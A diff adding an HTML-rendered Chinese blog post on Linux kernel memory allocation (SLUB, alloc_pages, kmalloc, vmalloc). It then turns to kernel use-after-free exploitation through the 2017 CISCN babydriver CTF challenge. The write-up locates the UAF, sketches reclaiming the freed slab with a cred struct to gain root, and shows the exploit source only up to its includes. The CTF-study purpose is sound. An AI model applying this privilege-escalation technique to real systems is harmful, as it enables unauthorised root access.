+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>      <span class="k">struct</span> <span class="n">page</span> <span class="o">*</span><span class="n">partial</span><span class="p">;</span>   <span class="cm">/* Partially allocated frozen slabs */</span>
+</span></span><span class="line"><span class="cl">  <span class="cp">#endif
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>  <span class="cp">#ifdef CONFIG_SLUB_STATS
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>      <span class="kt">unsigned</span> <span class="n">stat</span><span class="p">[</span><span class="n">NR_SLUB_STAT_ITEMS</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">  <span class="cp">#endif
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>  <span class="p">};</span>
+</span></span></code></pre></div><p>freelist指向第一个空闲的对象(假设为x)，page指向x所在slab(的第一页)。这里的page有以下特点：</p>
+<ul>
+<li>objects = slab的对象数</li>
+<li>inuse = objects</li>
+<li>frozen = 1</li>
+<li><strong>freelist = NULL</strong></li>
+</ul>
+<p>partial主要包含本地部分分配的slab。partial指向的page有以下特点：</p>
+<ul>
+<li><strong>next指向下一个slab(page)</strong></li>
+<li>freelist指向slab中第一个空闲object</li>
+<li>inuse = slab中已使用的object个数</li>
+<li>frozen = 1</li>
+</ul>
+<p>其中第一个page的<code>pbojects</code>记录了partial objects数。</p>
+<h4 id="kmem_cache_node">kmem_cache_node<a hidden class="anchor" aria-hidden="true" href="#kmem_cache_node">#</a></h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">kmem_cache_node</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">spinlock_t</span> <span class="n">list_lock</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">...</span>
+</span></span><span class="line"><span class="cl"><span class="cp">#ifdef CONFIG_SLUB
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">nr_partial</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">list_head</span> <span class="n">partial</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">..</span>
+</span></span><span class="line"><span class="cl"><span class="cp">#endif
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="p">};</span>
+</span></span></code></pre></div><p>这个数据结构根据配置的<code>SL[OAU]B</code>分配器而异，对于SLUB而言，使用的字段就只有两个，nr_partial和partial。其中partial是Linux内核中可插拔式通用双链表结构，使用内核中双链表的接口进行操作。nr_partial表示partial双链表中的元素个数，即slab的个数。</p>
+<p><strong>partial-&gt;next</strong> 指向的page结构，用于该结构的page有如下特点：</p>
+<ul>
+<li>frozon = 0</li>
+<li>freelist指向slab中第一个空闲object</li>
+<li>inuse表示对应slab使用中的object个数</li>
+<li><strong>通过lru字段索引链表中的下一个/前一个page</strong></li>
+</ul>
+<p><a href="https://bbs.kanxue.com/elink@a6eK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6A6L8h3N6@1N6g2"><img alt="hNYRaR.png" decoding="async" loading="lazy" src="https://bbs.kanxue.com/upload/attach/202109/876323_4TKWUYMGBENDFDG.jpg" style="max-width: 100%; height: auto;"></a></p>
+<h4 id="slab-cache">slab cache<a hidden class="anchor" aria-hidden="true" href="#slab-cache">#</a></h4>
+<p>一个 slab cache 包含多个 slab，每个 slab 包含多个对象。</p>
+<p><img alt="slab org" decoding="async" loading="lazy" src="https://hammertux.github.io/img/slab-org.png" style="max-width: 100%; height: auto;"></p>
+<h3 id="获得页">获得页<a hidden class="anchor" aria-hidden="true" href="#获得页">#</a></h3>
+<p>内核提供了一种请求内存的底层机制，并提供了对它进行访问的几个接口。所有这些接口都以页为单位分配内存，定义于<code>&lt;linux/gfp.h&gt;</code>中。最核心的函数是：</p>
+<pre tabindex="0"><code>struct page * alloc_pages()
+</code></pre><p>该函数分配 2^order（1&laquo;order）个连续的物理页，并返回一个指针，该指针指向第一个页的 page 结构体；如果出错，就返回 NULL。</p>
+<p>你可以使用以下函数将给定的页转换成它的逻辑地址：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="o">*</span> <span class="nf">page_address</span><span class="p">(</span><span class="k">struct</span> <span class="n">page</span> <span class="o">*</span><span class="n">page</span><span class="p">)</span>
+</span></span></code></pre></div><p>该函数返回一个指针，指向给定物理页当前所在的逻辑地址。如果你无须用到<code>struct page</code>，你可以调用：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kt">long</span> <span class="nf">__get_free_pages</span><span class="p">(</span><span class="kt">gfp_t</span> <span class="n">gfp_mask</span><span class="p">,</span><span class="n">unsiged</span> <span class="kt">int</span> <span class="n">order</span><span class="p">)</span>
+</span></span></code></pre></div><p>这个函数与<code>alloc_pages</code>作为相同，不过它直接返回所请求的第一个页的逻辑地址。因为页是连续的，所以其他页也会紧随其后。</p>
+<pre tabindex="0"><code>struct page * alloc_page()
+unsigned long __get_free_page(gfp_t gfp_mask,unsiged int order)
+</code></pre><p>传递给 order 值为 0，分配一个页。</p>
+<h4 id="获得填充为0的页">获得填充为0的页<a hidden class="anchor" aria-hidden="true" href="#获得填充为0的页">#</a></h4>
+<p>如果需要让返回的页内容全为 0，用以下函数：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kt">long</span> <span class="nf">get_zeroed_page</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">gfp_mask</span><span class="p">)</span>
+</span></span></code></pre></div><p>这个函数与<code>__get_free_pages</code>工作方式相同，只不过把分配好的页都填充成了 0——字节中的每一位都要取消设置。如果分配的页是给用户空间的，这个函数就非常有用了。虽说分配好的页中应该包含的都是随机产生的垃圾信息。但其实这些信息可能并不是完全随机的——它很可能 “随机地” 包含某些敏感数据。用户空间的页在返回之前，所有数据必须填充为 0，或做其他清理工作。</p>
+<p>下表是所有底层的页分配方法的列表：</p>
+<table>
+  <thead>
+      <tr>
+          <th>标志</th>
+          <th>描述</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td><code>alloc_page(gfp_mask)</code></td>
+          <td>只分配一页，返回指向页结构的指针</td>
+      </tr>
+      <tr>
+          <td><code>alloc_pages(gfp_mask, order)</code></td>
+          <td>分配 2^order 个页，返回指向第一页页结构的指针</td>
+      </tr>
+      <tr>
+          <td><code>__get_free_page(gfp_mask)</code></td>
+          <td>只分配一页，返回指向其逻辑地址的指针</td>
+      </tr>
+      <tr>
+          <td><code>__get_free_pages(gfp_mask, order)</code></td>
+          <td>分配 2^order 个页，返回指向第一页页逻辑地址的指针</td>
+      </tr>
+      <tr>
+          <td><code>get_zeroed_page(gfp_mask)</code></td>
+          <td>只分配一页，让其内容填充 0，返回指向其逻辑地址的指针</td>
+      </tr>
+  </tbody>
+</table>
+<h4 id="释放页">释放页<a hidden class="anchor" aria-hidden="true" href="#释放页">#</a></h4>
+<p>当你不再需要页时可以用下面的函数释放它们：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="nf">__free_pages</span><span class="p">(</span><span class="k">struct</span> <span class="n">page</span> <span class="o">*</span><span class="n">page</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">order</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nf">free_pages</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">addr</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">order</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nf">free_page</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">addr</span><span class="p">)</span>
+</span></span></code></pre></div><p>释放页时要谨慎，只能释放属于你的页。传递了错误的<code>struct page</code>或地址，用了错误的 order 值，这些都可能导致系统崩溃。</p>
+<p>调用<code>_get_free_pages</code>之后要注意进行错误检查。内核分配可能失败，因为你的代码必须进行检查并做相应的处理。这意味在此之前，你所做的所有工作可能前功尽弃，甚至还需要回归到原来的状态。</p>
+<p>当你需要以页为单位的一族连续物理页时，尤其是在你只需要一两页时，这些低级页函数很有用。对于常用的以字节为单位的分配来说，内核提供的函数是<code>kmalloc()</code>。</p>
+<h3 id="kmalloc">kmalloc<a hidden class="anchor" aria-hidden="true" href="#kmalloc">#</a></h3>
+<p><code>kmalloc</code>函数与用户空间的<code>malloc</code>一族函数非常相似，只不过它多了一个 flags 参数。<code>kmalloc</code>函数是一个简单的接口，用它可以获得以字节为单位的一块内核内存。如果你需要这个页，那么，前面讨论的页分配接口可能是更好的选择，但是，对于大多数讷河分配来说，<code>kmalloc</code>接口用得更多。</p>
+<p><code>kmalloc()</code>用于申请较小的/连续的物理内存，以字节为单位进行分配。</p>
+<p><code>kmalloc</code>和<code>kfree</code>函数原型如下：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">//include/linux/slab.h
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">void</span> <span class="o">*</span><span class="nf">kmalloc</span><span class="p">(</span><span class="kt">size_t</span> <span class="n">size</span><span class="p">,</span> <span class="kt">int</span> <span class="n">flags</span><span class="p">)</span>   <span class="c1">// 分配的内存物理地址上连续，虚拟地址上自然连续
+</span></span></span></code></pre></div><p>这个函数返回一个指向内存块的指针，其内存块至少要有 size 大小。所分配的内存区在物理上是连续的。在出错时，它返回 NULL。除非没有足够的内存可用，否则内核总能分配成功。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">dog</span> <span class="o">*</span><span class="n">p</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">=</span><span class="nf">kmalloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">dog</span><span class="p">),</span><span class="n">GFP_KERNEL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">p</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">//处理错误
+</span></span></span></code></pre></div><p>GFP_KERNEL 标志表示在试图获取内存并返回给<code>kmalloc</code>的调用者的过程中，内存分配器将要采取的行为。</p>
+<h3 id="kfree">kfree<a hidden class="anchor" aria-hidden="true" href="#kfree">#</a></h3>
+<p>kmalloc 的另一端就是<code>kfree</code>：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">kfree</span><span class="p">(</span><span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="n">ptr</span><span class="p">)</span> <span class="c1">//释放由kmalloc()分配出来的内存块。
+</span></span></span></code></pre></div><p><code>kfree</code>函数释放由<code>kmalloc</code>分配出来的内存块。如果想要释放的内存不是由 kammloc 分配的，或者想要释放的内存早就被释放了，比如说释放属于内核其他部分的内存，调用这个函数就会导致严重的后果。与用户空间类似，分配和回收要注意配对使用，以避免内存泄露和其他 bug。注意，调用<code>kfree(NULL)</code>是安全的。</p>
+<p>让我们开一个在中断处理程序中分配内存的例子。在这个例子中，中断处理程序想分配一个缓冲区来保持输入数据。<code>BUF_SIZE</code>预定义为以字节为单位的缓冲区长度，它应该是大于两个字节的。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">dog</span> <span class="o">*</span><span class="n">p</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">=</span><span class="nf">kmalloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">dog</span><span class="p">),</span><span class="n">GFP_KERNEL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">p</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">//处理错误
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    
+</span></span><span class="line"><span class="cl"><span class="nf">kfree</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
+</span></span></code></pre></div><h3 id="vmalloc">vmalloc<a hidden class="anchor" aria-hidden="true" href="#vmalloc">#</a></h3>
+<p><code>vmalloc()</code>用于申请较大的内存空间，虚拟内存是连续的，物理地址则无需连续，以字节为单位进行分配。</p>
+<p><code>kmalloc</code>函数确保页在物理地址上是连续的（虚拟地址自然也是连续的）。<code>vmalloc</code>函数只确保页在虚拟地址空间内是连续的。它通过分配非连续的物理内存块，再修正页表，把内存映射到逻辑地址空间的连续区域中，就能做到这点。</p>
+<p>大多数情况下，只有硬件设备需要得到物理地址连续的内存。在很多体系结构上，硬件设备存在于内存管理单元以外，它根本不理解什么是虚拟地址。因此，硬件设备用到的任何内存区都必须是物理上连续的块，而不仅仅是虚拟地址连续上的块。而仅供软件使用的内存块（例如与进程相关的缓冲区）就可以使用只有虚拟地址连续的内存块。但在你的编程中，根本察觉不到这种差异。对内核而言，所有内存看起来都是逻辑上连续的。</p>
+<p>尽管在某些情况下才需要物理上连续的内存块，但是，很多内核代码都用<code>kmalloc</code>来获得内存，而不是<code>vmalloc</code>。这主要是性能的考虑。vmalloc 函数为了把物理上不连续的页转换为虚拟地址空间上连续的页，必须专门建立页表项。糟糕的是，通过<code>vmalloc</code>获得的页必须一个一个地进行映射（因为它们物理是是不连续的），这就会导致比直接内存映射大得多的 TLB 抖动。因为这些原因，vmalloc 仅在不得已时才会使用——典型的就是为了获得大块内存时，例如，当模块被动态插入到内核中时，就把模块装载到由<code>vmalloc</code>分配的内存上。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">include</span><span class="o">/</span><span class="n">linux</span><span class="o">/</span><span class="n">vmalloc</span><span class="p">.</span><span class="n">h</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl"><span class="err">`</span><span class="o">&lt;</span><span class="n">linux</span><span class="o">/</span><span class="n">vmalloc</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="o">*</span><span class="nf">vmalloc</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">size</span><span class="p">)</span>  <span class="c1">// 分配的内存虚拟地址上连续，物理地址不连续
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">void</span> <span class="nf">vfree</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">addr</span><span class="p">)</span>  <span class="c1">// 这个函数可以睡眠，因此不能从中断上下文调用。
+</span></span></span></code></pre></div><ul>
+<li>
+<p>函数功能：分配一块不连续的地址空间，它分配的物理地址一般不连续的，但是虚拟地址是连续的，分配的内存空间被映射进入内核数据段当中，从用户空间角度是不可见的。</p>
+</li>
+<li>
+<p>该函数返回一个指针，指向逻辑上连续的一块内存区，其大小至少 size。在发生错误时，函数返回 NULL。函数可能睡眠，因此，不能从中断上下文中进行调用，也不能从其他不允许阻塞的情况下进行调用。</p>
+</li>
+<li>
+<p>vfree 会释放从 addr 开始的内存块，其中 addr 是以前由 vmalloc 分配的内存块的地址。这个函数也可以睡眠，因此，不能从中断上下文中调用。它没有返回值。</p>
+</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">char</span> <span class="o">*</span><span class="n">buf</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">buf</span> <span class="o">=</span> <span class="nf">vmalloc</span><span class="p">(</span><span class="mi">16</span> <span class="o">*</span> <span class="n">PAGE_SIZE</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">bug</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="c1">//错误
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nf">vfree</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
+</span></span></code></pre></div><p>函数功能：</p>
+<p><code>vmalloc</code>和<code>kmalloc</code>的区别</p>
+<p><code>kmalloc</code>保证分配的内存在物理上是连续的，<code>vmalloc</code>保证的是在虚拟地址空间上的连续，<code>malloc</code>不保证任何东西；</p>
+<p><code>kmalloc</code>能分配的大小有限，<code>vmalloc</code>和malloc能分配的大小相对较大；</p>
+<p>内存只有在要被DMA（直接内存访问）访问的时候才需要物理上连续；DMA 是指外设在不经过 CPU 干预的情况下，直接访问主内存读取或写入数据。</p>
+<p>vmalloc比kmalloc要慢；kmalloc对应于kfree，可以分配连续的物理内存；vmalloc对应于vfree，分配连续的虚拟内存，但是物理上不一定连续。 </p>
+<p>vmalloc分配内存的时候逻辑地址是连续的，但物理地址一般是不连续的，适用于那种一下需要分配大量内存的情况，如insert模块的时候。这种分配方式性能不入kmalloc。 </p>
+<p>kmalloc分配内存是基于slab，因此slab的一些特性包括着色，对齐等都具备，性能较好。物理地址和逻辑地址都是连续的。</p>
+<p>最主要是区别是：</p>
+<p>在设备驱动程序或者内核模块中动态开辟内存，不是用malloc，而是kmalloc ,vmalloc，释放内存用的是kfree,vfree，kmalloc函数返回的是虚拟地址(线性地址). kmalloc特殊之处在于它分配的内存是物理上连续的,这对于要进行DMA的设备十分重要. 而用vmalloc分配的内存只是线性地址连续,物理地址不一定连续,不能直接用于DMA。vmalloc函数的工作方式类似于kmalloc，只不过前者分配的内存虚拟地址是连续的，而物理地址则无需连 续。通过vmalloc获得的页必须一个一个地进行映射，效率不高， 因此，只在不得已(一般是为了获得大块内存)时使用。vmalloc函数返回一个指针，指向逻辑上连续的一块内存区，其大小至少为size。在发生错误 时，函数返回NULL。vmalloc可能睡眠，因此，不能从中断上下文中进行调用，也不能从其它不允许阻塞的情况下调用。要释放通过vmalloc所获 得的内存，应使用vfree函数</p>
+<ol>
+<li><code>vmalloc</code>分配的一般为高端内存，只有当内存不够的时候才分配低端内存；<code>kmallco</code>从低端内存分配；</li>
+<li><code>vmalloc</code>分配的物理地址一般不连续，而<code>kmalloc</code>分配的地址连续，两者分配的虚拟地址都是连续的；</li>
+<li><code>vmalloc</code>分配的一般为大块内存，而<code>kmalloc</code>一般分配的为小块内存，（一般不超过128k)。</li>
+</ol>
+<h2 id="uaf">UAF<a hidden class="anchor" aria-hidden="true" href="#uaf">#</a></h2>
+<p>和用户态的 UAF 相似，都是在某一个结构体释放后忘记将指针清空。</p>
+<p>常见两种情况：</p>
+<ol>
+<li>结构体 A 本身不存在函数指针，但是<code>free</code>后可以 edit，那么需要让另外一个含有函数指针的结构体 B 放入相同位置，之后修改函数指针。</li>
+<li>结构体 A 本身有函数指针，但是 free 之后无法 edit，这时候需要分配一个可以 edit 的结构体 B 放入相同位置，修改函数指针。</li>
+</ol>
+<p>一般结构体 A 是题目提供的，而结构体 B 可以调用 Linux 操作系统自带的一些设备获得。</p>
+<p>对于第二种情况，常用结构体是<code>msg_msg</code>，其可以申请的 size 十分灵活，但是头部的 0x30 个字节无法控制。</p>
+<blockquote>
+<p>例题 2017ciscn_babydriver</p>
+</blockquote>
+<p>与用户态 glibc 中分配 fake chunk 后覆写 <code>__free_hook</code> 这样的手法类似，我们同样可以通过覆写 freelist 中的 next 指针的方式完成内核空间中任意地址上的对象分配，并修改一些有用的数据以完成提权。</p>
+<p>内核中 cred 结构体的大小一般约为 0xa8（不同 kernel 大小略微不同）。</p>
+<p>内核 kmalloc 会从 slab 缓存（kmalloc-192 或 kmalloc-256）中分配一块内存，而 cred 结构体在内核中一般也是从 <strong>同一个 slab 缓存</strong> 分配的。</p>
+<p>由于内核是基于 slab 的：</p>
+<blockquote>
+<p><strong>如果 cred 结构体刚被 free，下一次 kmalloc 就很容易拿到同一块内存。</strong></p>
+</blockquote>
+<p>和 ptmalloc 中大部分 bins 以 0x10 为单位分割不同，slub 级别是以 2^n 为单位进行管理。而且在调用 kmalloc 的时候，根据值是不是常量，还会用不同的方式进行调用。如果值是常量，将直接去选择对应的<code>kmem_cache</code>。</p>
+<p>对于 slub中的<code>free</code>与<code>kmalloc</code>，可以简单的认为 free 以后，再次 malloc 就会拿到 free 的那一块内存。</p>
+<p><strong>那块刚被 free 的内存（大小 0xa8）会重新进入 slab allocator 的空闲列表，等待下次分配。</strong></p>
+<blockquote>
+<p>例题 2017ciscn_babydriver</p>
+</blockquote>
+<h3 id="分析">分析<a hidden class="anchor" aria-hidden="true" href="#分析">#</a></h3>
+<p>启动内核出错：</p>
+<img src="/assets/image-20251117135851186.png" alt="image-20251117135851186" style="zoom:50%;" />
+<p>这是因为 qemu 在启动时尝试使用 kvm 硬件加速，但系统上没有可用的 kvm模块或权限不足。</p>
+<p>加载 kvm 模块：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">sudo modprobe kvm_intel   <span class="c1"># Intel CPU</span>
+</span></span><span class="line"><span class="cl">sudo modprobe kvm_amd     <span class="c1"># AMD CPU</span>
+</span></span></code></pre></div><p>查看分析 init 文件：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="cp">#!/bin/sh
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl">mount -t proc none /proc
+</span></span><span class="line"><span class="cl">mount -t sysfs none /sys
+</span></span><span class="line"><span class="cl">mount -t devtmpfs devtmpfs /dev
+</span></span><span class="line"><span class="cl">chown root:root flag
+</span></span><span class="line"><span class="cl">chmod <span class="m">400</span> flag
+</span></span><span class="line"><span class="cl"><span class="nb">exec</span> 0&lt;/dev/console
+</span></span><span class="line"><span class="cl"><span class="nb">exec</span> 1&gt;/dev/console
+</span></span><span class="line"><span class="cl"><span class="nb">exec</span> 2&gt;/dev/console
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">insmod /lib/modules/4.4.72/babydriver.ko
+</span></span><span class="line"><span class="cl">chmod <span class="m">777</span> /dev/babydev
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> -e <span class="s2">&#34;\nBoot took </span><span class="k">$(</span>cut -d<span class="s1">&#39; &#39;</span> -f1 /proc/uptime<span class="k">)</span><span class="s2"> seconds\n&#34;</span>
+</span></span><span class="line"><span class="cl">setsid cttyhack setuidgid <span class="m">1000</span> sh
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">umount /proc
+</span></span><span class="line"><span class="cl">umount /sys
+</span></span><span class="line"><span class="cl">poweroff -d <span class="m">0</span>  -f
+</span></span></code></pre></div><p>发现 flag 文件在 root 目录下，并且只有 root 用户才可以读取。</p>
+<p>并且系统初始化时加载了<code>lib/modules/4.4.72</code>目录下的<code>babydriver.ko</code>模块，所以漏洞应该在这个模块中。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">mkdir rootfs <span class="o">&amp;&amp;</span> <span class="nb">cd</span> rootfs
+</span></span><span class="line"><span class="cl">cpio -idvm &lt; ../rootfs.cpio
+</span></span></code></pre></div><p>然后将模块文件复制出来：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">cp ./rootfs/lib/modules/4.4.72/babydriver.ko ./                 
+</span></span></code></pre></div><p>ida 反编译分析：</p>
+<ul>
+<li>分配一个字符设备号<code>babydev_no</code></li>
+<li>初始化<code>cdev</code>结构体</li>
+<li>注册字符设备到内核</li>
+<li>创建<code>/sys/class/babydev</code></li>
+<li>创建<code>/dev/babydev</code>设备节点</li>
+<li>注册失败则清理资源。</li>
+</ul>
+<img src="/assets/image-20251117140932416.png" alt="image-20251117140932416" style="zoom:50%;" />
+<ul>
+<li>babyopen</li>
+</ul>
+<p>申请 0x40 大小的内存，并把地址存在<code>device_buf</code>，<code>device_buf_len=0x40</code>。</p>
+<img src="/assets/image-20251117141457421.png" alt="image-20251117141457421" style="zoom:50%;" />
+<ul>
+<li>babyread</li>
+</ul>
+<p>检查<code>device_buf</code>是否存在，存在则比较其大小和用户读取请求的长度。</p>
+<img src="/assets/image-20251117141342300.png" alt="image-20251117141342300" style="zoom:50%;" />
+<p>但是这里的伪代码是有问题的，<code>copy_to_user</code>的参数没有反编译完整。</p>
+<p><code>copy_to_user</code>的原型：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kt">long</span> <span class="nf">copy_to_user</span><span class="p">(</span><span class="kt">void</span> <span class="n">__user</span> <span class="o">*</span><span class="n">to</span><span class="p">,</span> <span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="n">from</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">n</span><span class="p">);</span>
+</span></span></code></pre></div><p>通过快捷键<code>y</code>修改<code>copy_to_user</code>原型添加两个参数类型：</p>
+<p><img alt="image-20251117143247052" decoding="async" loading="lazy" src="../assets/image-20251117143247052.png" style="max-width: 100%; height: auto;"></p>
+<p>修复后的伪代码：</p>
+<p><img alt="image-20251117143226303" decoding="async" loading="lazy" src="../assets/image-20251117143226303.png" style="max-width: 100%; height: auto;"></p>
+<p>所以下面的代码逻辑是：如果<code>device_buf</code>大于用户请求长度，则将<code>device_buf</code>复制用户请求大小的长度到用户态<code>buffer</code>参数中。</p>
+<ul>
+<li>babywrite</li>
+</ul>
+<p><code>copy_to_user</code>的参数同样有问题，使用上面的方法修改一下：</p>
+<img src="/assets/image-20251117144648067.png" alt="image-20251117144648067" style="zoom:50%;" />
+<p>这里可以结合汇编分析出<code>v4</code>的值是从<code>length</code>参数获取的：</p>
+<img src="/assets/image-20251117144844192.png" alt="image-20251117144844192" style="zoom:50%;" />
+<ul>
+<li>babyrelease</li>
+</ul>
+<p>通过<code>kfree</code>释放<code>device_buf</code>，但是这里释放后未将指针置为零，所以存在 UAF 漏洞。</p>
+<img src="/assets/image-20251117141542102.png" alt="image-20251117141542102" style="zoom:50%;" />
+<ul>
+<li>babyioctl</li>
+</ul>
+<p>如果<code>command</code>参数的值等于<code>0x10001</code>，则释放掉<code>device_buf</code>，然后再申请<code>v4</code>大小的<code>device_buf</code>。</p>
+<img src="/assets/image-20251117143741195.png" alt="image-20251117143741195" style="zoom:50%;" />
+<p>就是当用户态调用以下代码时执行：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">ioctl<span class="o">(</span>fd, 0x10001, size<span class="o">)</span><span class="p">;</span>
+</span></span></code></pre></div><p><code>v4</code>的值是<code>v3</code>的值，不过<code>v3</code>的值是哪里来的？</p>
+<p>结合汇编分析一下可以发现是从<code>arg</code>参数获取到的。</p>
+<img src="/assets/image-20251117143650644.png" alt="image-20251117143650644" style="zoom:50%;" />
+<h3 id="思路">思路<a hidden class="anchor" aria-hidden="true" href="#思路">#</a></h3>
+<p>本题中白给了一个<code>UAF</code>，这意味着我们可以通过释放一个<code>object</code>，再让内核中的某个结构体使用这个<code>object</code>，便可以达到任意写这个<code>object</code>的目的。这也就是我们<code>kernel pwn</code>的<code>UAF</code>中的常见利用方式。</p>
+<p>因此，结构体的选择便是一个有趣的问题，根据结构体的不同，我们有不同的解题方案来选择。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/stat.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/ioctl.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/wait.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mh">0x40</span><span class="p">]</span><span class="o">=</span><span class="p">{</span><span class="mi">0</span><span class="p">};</span>
+</span></span><span class="line"><span class="cl">
